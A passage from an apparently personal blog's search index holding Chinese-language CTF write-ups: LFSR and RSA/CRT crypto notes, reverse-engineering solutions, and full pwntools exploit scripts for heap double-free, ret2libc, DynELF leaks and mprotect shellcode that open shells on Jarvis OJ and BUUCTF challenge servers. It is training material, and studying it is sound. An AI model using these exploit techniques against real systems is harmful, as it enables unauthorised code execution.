2020","permalink":"/achieve/2019to2021/nctf2019childrsa/","section":"archive","summary":"今天碰巧又做了一遍这个题,除了之前用yafu嗯解，又去参考了一下paper解法","title":"[NCTF2019]childRSA"},{"content":"\r简单的LFSR模型 # 这是一个 度 m=3 、拥有三个触发器的LFSR\n最左边的状态位是在反馈路径中计算得到的\n最右边的为输出位\n看做下式\ndef fun(a,b): return a^b # （a+b）% 2 while 1: output(s0) t=feedback(s1,s0) s0=s1 s1=s2 s2=t LFSR的通用形式 # 在通用形式中加入了反馈系数 $P$,它决定该反馈器是否会被启用\n若 $P$ 为 1 则反馈是活跃的 若 $P$ 为 0 则反馈是关闭的 假定LFSR的初始值为 ${S_0},{S_1}\u0026hellip;..{S_{m-1}}$\n则下一个反馈系数 $S_m$ 就计算式如下\n${S_m}={S_{m-1}}\\cdot{P_{m-1}}+{S_{m-2}}\\cdot{P_{m-2}}\u0026hellip;\u0026hellip;{S_{0}}\\cdot{P_{0}};mod;2$\n归纳得出整个序列的计算方法为\n${S_{i+m}}\\equiv\\sum_{j=0}^{m-1}P_j\\cdot{S_{i+j}};mod;2;;;S_i,P_i\\in{0,1};i=1,2\u0026hellip;.$\n序列最大长度为 $2^m-1$\n假设已知 m 和部分output 求P # 如果知道 m 的范围可以考虑爆破来做\n已知： $$ \\begin{cases} {S_m}={S_{m-1}}\\cdot{P_{m-1}}+{S_{m-2}}\\cdot{P_{m-2}}\\cdots{S_{0}}\\cdot{P_{0}};mod;2\\ {S_{m+1}}={S_{m}}\\cdot{P_{m-1}}+{S_{m-1}}\\cdot{P_{m-2}}\\cdots{S_{1}}\\cdot{P_{0}};mod;2\\ \\vdots\\ {S_{2m-1}}={S_{2m-2}}\\cdot{P_{2m-3}}+{S_{m-1}}\\cdot{P_{m-2}}\\cdots{S_{m-1}}\\cdot{P_{0}};mod;2\\ \\end{cases} $$\n建立矩阵 # $$ \\begin{pmatrix} S_0 \u0026amp; S_1 \u0026amp; S_2 \u0026amp; \\cdots \u0026amp; S_{m-1} \u0026amp; S_{m}\\ S_1 \u0026amp; S_2 \u0026amp; S_3 \u0026amp; \\cdots \u0026amp;S_{m} \u0026amp; S_{m+1}\\ \\vdots \u0026amp; \\vdots \u0026amp; \\ddots \u0026amp; \\vdots \\\nS_{m-1} \u0026amp; S_{m-2} \u0026amp; S_{m-3} \u0026amp; \\cdots \u0026amp; S_{2m-2} \u0026amp; S_{2m-1} \\end{pmatrix} $$\n做法和一般矩阵是一样的，只是把加减法换成异或了\n算出来的向量 P\n$$ \\begin{pmatrix} P_0\\ P_1\\ \\vdots\\ P_{m-1}\n\\end{pmatrix} $$\n再用 P 把原模型构造出来\n了解整个模型就可以得到整个与加密有关的序列了\n","date":"21 August 2020","permalink":"/achieve/2019to2021/lsfr%E5%AD%A6%E4%B9%A0/","section":"archive","summary":"简单的LFSR模型 # 这是一个 度 m=3 、拥有三个触发器的LFSR","title":"基础LFSR 学习"},{"content":"","date":"18 August 2020","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"pwn"},{"content":"\rciscn_2019_en_3 # 补充一下 double free的原理 ：堆上的某块内存被释放后，并没有将指向该堆块的指针清零，那么，我们就可以利用程序的其他部分对该内存进行再次的free，由于fast bin是LIFO队列的单向链表，对同一个元素free两次可以使其形成环状\n再对指针进行修改从而达到对任意地址写的效果\ntcache dup 和 double free类似，但少了很多检测 (至少该libc是这样的) 可以轻松 free两次\ntcache全名thread local caching，它为每个线程创建一个缓存,对性能提高有显著的帮助\n__malloc_hook、__realloc_hook、__free_hook、__memalign_hook 四个全局函数hook指针。简单地说，就是 malloc 调用的是 __malloc_hook 指针指向的函数，所以 jemalloc 或者 tcmalloc 通过覆盖 __malloc_hook 使程序调用到它们自定义的malloc。\n思路 # 泄露libc 利用tcache修改free hook printd_chk可以用 %p 来泄露信息也可以利用利用read后面不补0的特性，输入8个字符把字沾满，来泄露栈上数据，得到libc\nexp # from pwn import * context( log_level = \u0026#39;debug\u0026#39;) import sys \u0026#39;\u0026#39;\u0026#39; elf = ELF(\u0026#39;./ciscn_2019_en_3\u0026#39;) libc = elf.libc \u0026#39;/glibc/2.28/64/lib/ld-2.28.so\u0026#39; \u0026#39;\u0026#39;\u0026#39; _libc = \u0026#39;./libc-2.27.so\u0026#39; libc = ELF(_libc) #p = remote(\u0026#34;node3.buuoj.cn\u0026#34;,26720) from pwn import * #p = process([\u0026#39;ld-2.27.so\u0026#39;, \u0026#34;./ciscn_2019_en_3\u0026#34;], env={\u0026#34;LD_PRELOAD\u0026#34;:_libc}) p = remote(\u0026#39;node3.buuoj.cn\u0026#39;, 26280) def Debug(s): print(s) print(\u0026#39;pid\u0026#39;, proc.pidof(p)) pause() def s2b(s): if type(s) != type(b\u0026#39;1\u0026#39;): return bytes(s, encoding=\u0026#39;utf-8\u0026#39;) else: return s def new(size,s): p.sendlineafter(\u0026#39;choice:\u0026#39;,b\u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;story:\u0026#39;,str(size)) p.sendlineafter(\u0026#39;story:\u0026#39;,s) def delete(s): p.sendlineafter(\u0026#39;choice:\u0026#39;,b\u0026#39;4\u0026#39;) p.recvuntil(\u0026#39;index:\u0026#39;) p.sendline(s) Debug(\u0026#34;start\u0026#34;) p.recvuntil(\u0026#39;name?\u0026#39;) p.sendline(\u0026#39;%p%p%p\u0026#39;)#name p.recvuntil(\u0026#39;0x200x\u0026#39;) re = (p.recv(12)) a = int(re,16) print(\u0026#39;recv\u0026#39;,hex(a)) #0xf7260 libc_base = a-0x110081 # 用了一下午错误的libc，懒得调了。。。直接相减算偏移了。。。 print(\u0026#39;libc_base\u0026#39;,hex(libc_base)) free_hook = libc_base + libc.sym[\u0026#39;__free_hook\u0026#39;] sys_add = libc_base + libc.sym[\u0026#39;system\u0026#39;] print(\u0026#34;free_hook\u0026#34;,hex(free_hook)) print(\u0026#34;sys_add_libc\u0026#34;, hex(libc.sym[\u0026#39;system\u0026#39;])) print(\u0026#34;system:\u0026#34;,hex(sys_add)) p.sendline(\u0026#39;1234\u0026#39;) # id new(0x10,b\u0026#39;1234\u0026#39;) # 0 new(0x10,b\u0026#39;/bin/sh\\x00\u0026#39;) # 1 Debug(\u0026#39;new_heap\u0026#39;) delete(b\u0026#39;0\u0026#39;) delete(b\u0026#39;0\u0026#39;) # double free形成环 Debug(\u0026#39;free_hook--\u0026gt;debug\u0026#39;) new(0x10,p64(free_hook)) new(0x10,\u0026#39;aa\u0026#39;) new(0x10,p64(sys_add)) # 向free hook中写入system Debug(\u0026#39;del\u0026#39;) delete(b\u0026#39;1\u0026#39;) Debug(\u0026#39;sh\u0026#39;) p.interactive() \u0026#39;\u0026#39;\u0026#39; print(libc.sym[\u0026#39;read\u0026#39;]) Debug(\u0026#39;1\u0026#39;) 0x7f5224771eb3 \u0026#39;\u0026#39;\u0026#39; free hook覆盖后的情况 # 调用free hook # ","date":"18 August 2020","permalink":"/achieve/2019to2021/pwn_heap_818/","section":"archive","summary":"ciscn_2019_en_3 # 补充一下 double free的原理 ：堆上的某块内存被释放后，并没有将指向该堆块的指针清零，那么，我们就可以利用程序的其他部分对该内存进行再次的free，由于fast bin是LIFO队列的单向链表，对同一个元素free两次可以使其形成环状","title":"几个堆入门"},{"content":"\r记个模板题 # 题目给了以下条件：\n$$\\begin{cases} M^e \\equiv C_1 mod\\;N_1 \\\\[2ex] M^e \\equiv C_2 mod\\;N_2\\quad \\quad (e = 3) \\\\[2ex] M^e \\equiv C_3 mod\\;N_3 \\end{cases} $$\nc1 = 388825822870813587493154615238012547494666151428446904627095554917874019374474234421038941934804209410745453928513883448152675699305596595130706561989245940306390625802518940063853046813376063232724848204735684760377804361178651844505881089386 c2 = 4132099145786478580573701281040504422332184017792293421890701268012883566853254627860193724809808999005233349057847375798626123207766954266507411969802654226242300965967704040276250440511648395550180630597000941240639594 c3 = 43690392479478733802175619151519523453201200942800536494806512990350504964044289998495399805335942227586694852363272883331080188161308470522306485983861114557449204887644890409995598852299488628159224012730372865280540944897915435604154376354144428 n1 = 924506488821656685683910901697171383575761384058997452768161613244316449994435541406042874502024337501621283644549497446327156438552952982774526792356194523541927862677535193330297876054850415513120023262998063090052673978470859715791539316871 n2 = 88950937117255391223977435698486265468789676087383749025900580476857958577458361251855358598960638495873663408330100969812759959637583297211068274793121379054729169786199319454344007481804946263873110263761707375758247409 n3 = 46120424124283407631877739918717497745499448442081604908717069311339764302716539899549382470988469546914660420190473379187397425725302899111432304753418508501904277711772373006543099077921097373552317823052570252978144835744949941108416471431004677 套中国剩余定理公式就可以了\nimport gmpy2 import binascii from libnum import invmod c1 = 388825822870813587493154615238012547494666151428446904627095554917874019374474234421038941934804209410745453928513883448152675699305596595130706561989245940306390625802518940063853046813376063232724848204735684760377804361178651844505881089386 c2 = 4132099145786478580573701281040504422332184017792293421890701268012883566853254627860193724809808999005233349057847375798626123207766954266507411969802654226242300965967704040276250440511648395550180630597000941240639594 c3 = 43690392479478733802175619151519523453201200942800536494806512990350504964044289998495399805335942227586694852363272883331080188161308470522306485983861114557449204887644890409995598852299488628159224012730372865280540944897915435604154376354144428 n1 = 924506488821656685683910901697171383575761384058997452768161613244316449994435541406042874502024337501621283644549497446327156438552952982774526792356194523541927862677535193330297876054850415513120023262998063090052673978470859715791539316871 n2 = 88950937117255391223977435698486265468789676087383749025900580476857958577458361251855358598960638495873663408330100969812759959637583297211068274793121379054729169786199319454344007481804946263873110263761707375758247409 n3 = 46120424124283407631877739918717497745499448442081604908717069311339764302716539899549382470988469546914660420190473379187397425725302899111432304753418508501904277711772373006543099077921097373552317823052570252978144835744949941108416471431004677 _M = n1*n2*n3 m1 = _M//n1 m2 = _M//n2 m3 = _M//n3 t1 = invmod(m1, n1) t2 = invmod(m2, n2) t3 = invmod(m3, n3) _X = (c1*t1*m1 + c2*t2*m2 + c3*t3*m3) % _M a = gmpy2.iroot(_X, 3) print((gmpy2.iroot(_X, 3))) s = hex(949557364767986162692541204888383714648410089749288993554212847615599100096583727459) s = binascii.a2b_hex(s[2:-1]) print(s[::-1]) # cybrics{h3y_guY5_c0m3_t0_my_p4rtY!} 其实一般用得到的是中国剩余定理的扩展 =v=\n","date":"26 July 2020","permalink":"/achieve/2019to2021/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86/","section":"archive","summary":"","title":"中国剩余定理"},{"content":"\rlevle4 # 没有libc了，要用 DynELF配合 leak 来找system的真正地址\nexp # from pwn import * io=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9880) elf=ELF(\u0026#34;./level4\u0026#34;) input_add = 0x804844B write_plt=elf.plt[\u0026#34;write\u0026#34;] read_plt=elf.plt[\u0026#34;read\u0026#34;] bss_add = 0x0804a024 #0804844B vulnerable_function def leak(add): payload = \u0026#39;a\u0026#39;*(0x88+4)+p32(write_plt)+p32(input_add)+p32(1)+p32(add)+p32(4) io.send(payload) leak_sysadd = io.recv(4) return leak_sysadd d = DynELF(leak,elf = ELF(\u0026#34;./level4\u0026#34;)) sys_add = d.lookup(\u0026#34;system\u0026#34;,\u0026#34;libc\u0026#34;) payload2 = \u0026#39;a\u0026#39;*(0x88+4) + p32(read_plt)+p32(input_add)+p32(1)+p32(bss_add)+p32(8) io.sendline(payload2) io.sendline(\u0026#34;/bin/sh\u0026#34;) payload3 = \u0026#39;a\u0026#39;*(0x88+4) + p32(sys_add)+p32(input_add)+p32(bss_add) io.sendline(payload3) io.interactive() def leak(add): payload = \u0026#39;a\u0026#39;*(0x88+4)+p32(write_plt)+p32(input_add)+p32(1)+p32(add)+p32(4) io.send(payload) leak_sysadd = io.recv(4) return leak_sysadd d = DynELF(leak,elf = ELF(\u0026#34;./level4\u0026#34;)) sys_add = d.lookup(\u0026#34;system\u0026#34;,\u0026#34;libc\u0026#34;) 这是利用DynELF找system的核心部分leak函数可以返回地址对应的值，让DynELF寻找到level4的地址页进而找到一系列的所需的表\n使用lookup在libc文件中搜索system函数的真实地址\nhttps://www.freebuf.com/articles/system/193646.html\npayload1= \u0026#39;a\u0026#39;*(0x88+4)+ p32(write_plt)+ p32(input_add)+ p32(1)+ p32(add)+ p32(4) \u0026gt;\u0026gt;\u0026gt; 等价执行 write(1,add,8) 并返回 input_add 进行下一次输出（下一次pwn） payload2 = \u0026#39;a\u0026#39;*(0x88+4) + p32(read_plt)+ p32(input_add)+ p32(1)+ p32(bss_add)+ p32(8) \u0026gt;\u0026gt;\u0026gt; 执行read(1,bss_add,8) 在 bss 写入 /bin/sh payload3 = \u0026#39;a\u0026#39;*(0x88+4) + p32(sys_add)+ p32(input_add)+ p32(bss_add) 执行ststem(bss_add) level5 # 按照要求尝试用mprotect来解决\n利用mproject修改.bss中内存的权限，然后将shellcode写入.bss段中执行即可\nmprotect原型\nint mprotect(const void *start, size_t len, int prot); 这里需要三个参数来使用这个函数，x64优先用寄存器传参，先找所需的 pop 指令\n只找到了 rdi rsi 没有 rdx 借用__libc_csu_init中的指令完成\nexp: # from pwn import * context.arch=\u0026#39;amd64\u0026#39; #p=process(\u0026#39;./l3\u0026#39;) \u0026#39;\u0026#39;\u0026#39; text:0000000000400690 loc_400690: ; CODE XREF: __libc_csu_init+54↓j .text:0000000000400690 mov rdx, r13 .text:0000000000400693 mov rsi, r14 .text:0000000000400696 mov edi, r15d .text:0000000000400699 call qword ptr [r12+rbx*8] .text:000000000040069D add rbx, 1 .text:00000000004006A1 cmp rbx, rbp .text:00000000004006A4 jnz short loc_400690 .text:00000000004006A6 .text:00000000004006A6 loc_4006A6: ; CODE XREF: __libc_csu_init+36↑j .text:00000000004006A6 add rsp, 8 .text:00000000004006AA pop rbx .text:00000000004006AB pop rbp .text:00000000004006AC pop r12 .text:00000000004006AE pop r13 .text:00000000004006B0 pop r14 .text:00000000004006B2 pop r15 \u0026#39;\u0026#39;\u0026#39; p=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9884) libc=ELF(\u0026#39;./libc-2.19.so\u0026#39;) elf=ELF(\u0026#39;./level3_x64\u0026#39;) write_plt = elf.plt[\u0026#39;write\u0026#39;] write_got = elf.got[\u0026#39;write\u0026#39;] read_plt = elf.plt[\u0026#39;read\u0026#39;] read_got = elf.got[\u0026#39;read\u0026#39;] bss = elf.bss() print(\u0026#39;bss=\u0026#39;,hex(bss)) input_add = 0x4005E6 rdi = 0x4006b3 rsi_r15 = 0x4006b1 gadget = 0x4006aa #确定libc的内存基址============================== p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload1 = 0x88*b\u0026#39;a\u0026#39;+p64(rdi)+p64(1)+p64(rsi_r15)+p64(read_got)+p64(1)+p64(write_plt)+p64(input_add) p.send(payload1) t=u64(p.recv(8)) print((\u0026#39;read_got\u0026#39;,hex(t))) libc.address=t-libc.symbols[\u0026#34;read\u0026#34;] #写入mproject ========================================== libc_start_main_got=elf.got[\u0026#39;__libc_start_main\u0026#39;] p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload2 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+p64(0)+p64(rsi_r15)+p64(libc_start_main_got)+p64(0)+p64(read_plt)+p64(input_add) p.send(payload2) mprotect_addr=libc.symbols[\u0026#39;mprotect\u0026#39;] print (hex(mprotect_addr)) p.send(p64(mprotect_addr)) #bss写入shellcode=================================================== p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload3 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+p64(0)+p64(rsi_r15)+p64(bss)+p64(0)+p64(read_plt)+p64(input_add) p.send(payload3) shellcode=asm(shellcraft.amd64.sh()) print (shellcode) p.send(shellcode) # bss地址写入 gmon_start中============================ p.recvuntil(\u0026#39;Input:\\n\u0026#39;) gmon_start = elf.got[\u0026#39;__gmon_start__\u0026#39;] payload4 = b\u0026#39;a\u0026#39;*(0x88)+p64(rdi)+p64(0x0)+p64(rsi_r15)+p64(gmon_start)+b\u0026#39;deadbeef\u0026#39;+p64(read_plt)+p64(input_add) p.send(payload4) p.send(p64(bss)) #修改权限并执行bss=================================================== \u0026#39;\u0026#39;\u0026#39; text:0000000000400690 loc_400690: ; CODE XREF: __libc_csu_init+54↓j .text:0000000000400690 mov rdx, r13 .text:0000000000400693 mov rsi, r14 .text:0000000000400696 mov edi, r15d .text:0000000000400699 call qword ptr [r12+rbx*8] .text:000000000040069D add rbx, 1 .text:00000000004006A1 cmp rbx, rbp .text:00000000004006A4 jnz short loc_400690 .text:00000000004006A6 .text:00000000004006A6 loc_4006A6: ; CODE XREF: __libc_csu_init+36↑j .text:00000000004006A6 add rsp, 8 .text:00000000004006AA pop rbx .text:00000000004006AB pop rbp .text:00000000004006AC pop r12 .text:00000000004006AE pop r13 .text:00000000004006B0 pop r14 .text:00000000004006B2 pop r15 \u0026#39;\u0026#39;\u0026#39; add_aa = 0x4006AA add_90 = 0x400690 p.recvuntil(\u0026#39;Input:\\n\u0026#39;) payload5 = 0x88*b\u0026#39;a\u0026#39;+p64(add_aa) + p64(0)+p64(1)+p64(libc_start_main_got)+p64(7)+p64(0x1000)+p64(0x600000)+p64(add_90)+p64(0)+p64(0)+p64(1)+p64(gmon_start)+p64(0)+p64(0)+p64(0)+p64(add_90) #payload=b\u0026#39;a\u0026#39;*(offset+8)+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(libc_start_main_got)+p64(7)+p64(0x1001)+p64(0x600000)+p64(call_addr)+b\u0026#39;deadbeef\u0026#39;+p64(0)+p64(1)+p64(gmon_start_got)+p64(0)+p64(0)+p64(0)+p64(call_addr) p.send(payload5) p.interactive() payload分析 # payload1 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+ p64(1)+ p64(rsi_r15)+ p64(write_got)+ p64(1)+ p64(write_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; write(1,write_got,0x200) payload2 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+ p64(0)+ p64(rsi_r15)+ p64(libc_start_main_got)+ p64(0)+ p64(read_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; read(0,libc_start_main_got,0x200) payload3 = 0x88*b\u0026#39;a\u0026#39;+ p64(rdi)+ p64(0)+ p64(rsi_r15)+ p64(bss)+ p64(0)+ p64(read_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; read(0,bss,0x200) payload4 = b\u0026#39;a\u0026#39;*(0x88)+ p64(rdi)+ p64(0x0)+ p64(rsi_r15)+ p64(gmon_start)+ b\u0026#39;deadbeef\u0026#39;+ p64(read_plt)+ p64(input_add) \u0026gt;\u0026gt;\u0026gt; read(0,gmon_start,0x200) payload5 = 0x88*b\u0026#39;a\u0026#39;+ p64(add_aa) + p64(0)+ rbx p64(1)+ rbp p64(libc_start_main_got)+ r12 ---\u0026gt;called p64(7)+ r13 --\u0026gt; rdx p64(0x1000) + r14 -- \u0026gt; rsi p64(0x600000)+ r15 ---\u0026gt; edi p64(add_90)+ p64(0)+ p64(0)+ p64(1)+ p64(gmon_start)+ p64(0)+ p64(0)+ p64(0)+ p64(add_90) 还是挺绕的 。。。。。\n","date":"8 July 2020","permalink":"/achieve/2019to2021/jarvis-oj-pwn-level4to6/","section":"archive","summary":"levle4 # 没有libc了，要用 DynELF配合 leak 来找system的真正地址","title":"Jarvis_OJ_pwn_level4to6"},{"content":"\rlevel0 # x86栈溢出\nexp1 # from pwn import * #nc pwn2.jarvisoj.com 9881 io = remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9881) io.recvuntil(\u0026#34;Hello, World\\n\u0026#34;) payload = b\u0026#39;a\u0026#39;*0x88 +p64(0x0400596) io.sendline(payload) io.interactive() # CTF{713ca3944e92180e0ef03171981dcd41} level1 # x86栈溢出 + pwntools自带的x86 shellcode使用\n保护全灰,可以写shellcode了\ngdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : disabled PIE : disabled RELRO : Partial\nssize_t vulnerable_function() { char buf; // [esp+0h] [ebp-88h] printf(\u0026#34;What\u0026#39;s this:%p?\\n\u0026#34;, \u0026amp;buf); return read(0, \u0026amp;buf, 0x100u); } 这里会输出buf的地址，在buf内设置shellcode，然后覆盖堆栈将ret跳转的目标修改到buf的开头（即 set ip 到shellcode的起始点）然后执行shellcode，再进交互系统\nexp2 # from pwn import * context( arch = \u0026#39;i386\u0026#39;) # 先选相应系统 # log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./level1\u0026#39;) io = remote(\u0026#39;pwn2.jarvisoj.com\u0026#39;, 9877) shellcode = asm(shellcraft.sh()) #print(\u0026#34;shell:\\n\u0026#34;,shellcraft.sh()) # What\u0026#39;s this:0x ffb0aa80 ?\\n buf = int(io.recvline()[14: -2], 16) payload = shellcode + b\u0026#39;\\x90\u0026#39; * (0x88 + 0x4 - len(shellcode)) payload += p32(buf) #修改 ret 跳转目标 io.send(payload) io.interactive() # CTF{82c2aa534a9dede9c3a0045d0fec8617} level2 # x86栈溢出 + x86传参规律\nfrom pwn import * #设置目标机的信息，用来建立远程链接，url或ip指明了主机，port设置端口 r = remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;, 9878) # nc pwn2.jarvisoj.com 9878 system=0x08048320 #r.recvuntil(\u0026#39;Input:\u0026#39;) sh = 0x0804A024 payload = b\u0026#39;a\u0026#39; * (0x88+4) + p32(system)+ p32(0) +p32(sh) r.recvline(\u0026#34;Input:\u0026#34;) r.sendline(payload) r.interactive() # 0804A024 /bin/sh # 08048320 system 又由于调用函数压参数是逆序，所以将system唯一一个参数放在system的返回位置后面一个位置就ok了\nlevel2 x64 # 先用ROPgadget找程序内有没有 pop rdi 可用拿来用 (ROPgadget真是好东西)\n0x00000000004006b3 : pop rdi ; ret pop rdi 把binsh_addr传入rdi\nret 把system_addr 给 rip\n就变成了执行 system ( [rdi] )\nexp # from pwn import * system_addr=0x000000000040063E poprdi_drt=0x00000000004006b3 binsh_addr=0x0000000000600A90 p=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;,9882) p.recvline() payload=b\u0026#39;A\u0026#39;*0x80+b\u0026#34;A\u0026#34;*8+p64(poprdi_drt)+p64(binsh_addr)+p64(system_addr) p.send(payload) p.interactive() \u0026#39;\u0026#39;\u0026#39; x64 优先使用用寄存器传参 rdi, rsi, rdx, rcx, r8, r9。当参数为 7 个以上时， 前 6 个与前面一样， 但后面的依次从 \u0026#34;右向左\u0026#34; 放入栈中。 CTF{081ecc7c8d658409eb43358dcc1cf446} \u0026#39;\u0026#39;\u0026#39; level3 x86 # 锁了 NX ,要泄露 libc\n之前没怎么看懂泄露 libc的操作，这两天闲着看了看算是看明白了\nfrom pwn import * io = remote(\u0026#39;pwn2.jarvisoj.com\u0026#39;,9879) write_plt=0x8048340 read = 0x804844B write_got=0x804A018 payload1 = b\u0026#39;a\u0026#39; * (0x88 + 0x4) + p32(write_plt) + p32(read) + p32(0x01) + p32(write_got) + p32(0x04) io.recvuntil(\u0026#39;Input:\\n\u0026#39;) io.sendline(payload1) write_add = u32(io.recv(4)) # 计算system函数和/bin/sh在内存中的真实地址 libc = ELF(\u0026#39;./libc-2.19.so\u0026#39;) t = write_add - libc.symbols[\u0026#39;write\u0026#39;] system = t + libc.symbols[\u0026#39;system\u0026#39;] binsh = t + next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) payload2 = b\u0026#39;a\u0026#39;*(0x88 + 0x4) payload2 += p32(system) + p32(0) + p32(binsh) io.recvuntil(\u0026#39;Input:\\n\u0026#39;) io.sendline(payload2) io.interactive() io.close() 好像只要是程序和libc里面有的函数都可以拿来泄露\u0026hellip;\n每次运行内存中的位置会发生变化\n溢出修改ret跳转值\n执行到write内部，函数将 write_got 作为参数输出在了屏幕上\nlevel3 x64 # 和x86版的区别是传参要借助寄存器,所以要找 pop 来传参(话说传参方式应该还有很多吧?)\n--\u0026gt; 0x00000000004006b3 : pop rdi ; ret --\u0026gt; 0x00000000004006b1 : pop rsi ; pop r15 ; ret from pwn import * p=remote(\u0026#34;pwn2.jarvisoj.com\u0026#34;, \u0026#34;9883\u0026#34;) elf=ELF(\u0026#39;./level3_x64\u0026#39;) libc=ELF(\u0026#39;./libc-2.19.so\u0026#39;) context.log_level=\u0026#34;debug\u0026#34; main_add=0x4005e6 writeplt=elf.symbols[\u0026#39;write\u0026#39;] writegot=elf.got[\u0026#39;write\u0026#39;] rdiset=0x00000000004006b3 # 1 rsiset=0x00000000004006b1 #2 payload0 = 0x88*b\u0026#39;a\u0026#39; payload0+=p64(rdiset) payload0+=p64(1) # 1 赋给 rdi payload0+=p64(rsiset) payload0+=p64(writegot) # writegot 给 rsi payload0+=p64(8) # 跳过 r15 payload0+=p64(writeplt)# write(1,writegot,0x200) rdx的0x200是read给的 payload0+=p64(main_add) p.recvuntil(\u0026#34;Input:\\n\u0026#34;) p.sendline(payload0) writeaddr=p.recv(8)# 收集 writegot 地址 writeaddr=u64(writeaddr) sysoffest=libc.symbols[\u0026#39;system\u0026#39;] binoffest=next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) t = writeaddr - libc.symbols[\u0026#39;write\u0026#39;] system=sysoffest + t sh=binoffest + t payload1 = b\u0026#39;a\u0026#39;*0x88 payload1 += p64(rdiset) payload1 += p64(sh)+p64(system) p.recvuntil(\u0026#34;Input:\\n\u0026#34;) p.sendline(payload1) p.interactive() ","date":"8 July 2020","permalink":"/achieve/2019to2021/jarvis-oj-pwn-level1to3/","section":"archive","summary":"level0 # x86栈溢出","title":"Jarvis_OJ_pwn_level1to3"},{"content":" 端午节回山里玩了一趟，做题时间仅有半天，做了的依旧只有re。。。。\nT0p_Gear # 签到题，但做法不是很签到\n三个判断输入三段字符串最后拿到完整flag\n经过动调发现fun1函数是拿来比较的，在fun1入口把字符串copy下来就行了\nflag1 c92bb6a5 # flag1密文校验\n_BOOL8 __usercall chk1@\u0026lt;rax\u0026gt;(YouWouldChk *this@\u0026lt;rdi\u0026gt;, __int64 a2@\u0026lt;rbp\u0026gt;, __m256i a3@\u0026lt;ymm7\u0026gt;) { __int128 v4; // [rsp-28h] [rbp-28h] unsigned __int64 v5; // [rsp-10h] [rbp-10h] __int64 v6; // [rsp-8h] [rbp-8h] __asm { endbr64 } v6 = a2; v5 = __readfsqword(0x28u); v4 = (unsigned __int64)\u0026#39;5a6bb29c\u0026#39;; std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;I drew a :\u0026#34;, 0LL); std::operator\u0026gt;\u0026gt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cin, YouWouldChk::chk1(void)::JC); return (unsigned int)fun1((unsigned __int64)YouWouldChk::chk1(void)::JC, (__int64)\u0026amp;v4, a3) == 0; } flag2 a6c30091 # flag2要从附件中读取秘钥来解码字符串，在fun1处copy下来就行了\n__asm { endbr64 } key = a3; // 神必字符串 v25 = __readfsqword(0x28u); v17 = \u0026#39;txt.tt\u0026#39;; v18 = 0LL; v19 = 0LL; v20 = 0LL; v21 = 0LL; v22 = 0LL; v23 = 0LL; v24 = 0LL; v6 = YouWouldChk::readStrFromFile(this, (char *)\u0026amp;v17, (char *)\u0026amp;v12, (__int64)\u0026amp;key); YouWouldChk::deAes(this, (char *)\u0026amp;v12, a2, v6, (__int64)\u0026amp;key, a5, a6);//aes解密 v13 = 0LL; v14 = 0LL; v15 = 0LL; v16 = 0LL; sub_4010D0((unsigned __int64)\u0026amp;v12, (signed __int64)\u0026amp;v13, (unsigned __int64)\u0026amp;v12, a5, a6); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cout, \u0026#34;Richard steals some:\u0026#34;, v7); std::operator\u0026gt;\u0026gt;\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;std::cin, YouWouldChk::deAesFileAndMore(char *)::RH); i_1 = 0; for ( i = 0; *((_BYTE *)\u0026amp;v12 + i); ++i ) { if ( *((_BYTE *)\u0026amp;key + i - 144) != \u0026#39;f\u0026#39; ) { v8 = i_1++; *((_BYTE *)\u0026amp;key + v8 - 144) = *((_BYTE *)\u0026amp;key + i - 144); } } *((_BYTE *)\u0026amp;key + i_1 - 144) = 0; return (unsigned int)fun1((unsigned __int64)\u0026amp;v12, (__int64)YouWouldChk::deAesFileAndMore(char *)::RH, a4) == 0; flag3 24566d882d4bc7ee # 和flag1一样fun1处复制下来\n然后拼到一起\nc92bb6a5a6c3009124566d882d4bc7ee\nmaze # 简单地图，不像上个月有多重路径搞得很迷惑\n动调载入地图复制出来，稍微处理一下\nX X X X X # X X X X X X X X X X X X X X X X X X X X X X X X X X md5(jkkjjhjjkjjkkkuukukkuuhhhuukkkk )\nMagia # for ( i = 31; i_1 \u0026lt; i; --i ) { if ( (flag[i] ^ flag[i_1]) != *(\u0026amp;v59 + i_1) ) { f(\u0026#34;No_need_to_scare\u0026#34;); return 0; } if ( (flag[i] \u0026amp; flag[i_1]) != *(\u0026amp;v43 + i_1) ) { f(\u0026#34;No_need_to_scare\u0026#34;); return 0; } if ( (flag[i_1] \u0026amp; 0xF) != *(\u0026amp;v11 + i_1) || (flag[i] \u0026amp; 0xF) != *(\u0026amp;v11 + i) ) { f(\u0026#34;No_need_to_scare\u0026#34;); return 0; } ++i_1; } 根据以上判断条件我们可以得到81个符合条件的flag\nNep{mYrclU_a^dOmaxooisonotofree} Nep{mYrclU_a^d_mahooisonotofree} Nep{mYrclU_a^domaXooisonotofree} Nep{mYrclU_andOmaxo_isonotofree} Nep{mYrclU_and_maho_isonotofree} Nep{mYrclU_andomaXo_isonotofree} 